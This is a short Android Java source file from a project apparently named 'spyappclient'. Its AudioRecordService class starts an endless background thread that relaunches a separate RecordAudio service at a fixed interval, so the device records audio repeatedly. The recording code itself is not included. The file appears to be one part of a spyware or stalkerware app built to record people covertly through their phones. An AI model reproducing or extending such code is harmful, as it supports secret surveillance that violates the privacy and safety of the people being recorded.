package com.example.alber.spyappclient;

import android.app.IntentService;
import android.content.Intent;
import android.support.annotation.Nullable;
import android.util.Log;

public class AudioRecordService extends IntentService{
    private static String LOG = "AudioRecordService";
    public AudioRecordService() {

        super(AudioRecordService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {}

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        record();
        this.stopSelf();
    }

    private void record() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    Log.v(LOG, "Record");
                    Intent audioIntent = new Intent(getApplicationContext(), RecordAudio.class);
                    startService(audioIntent);
                    try {
                        Thread.sleep(Properties.AudioRecordInterval);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}
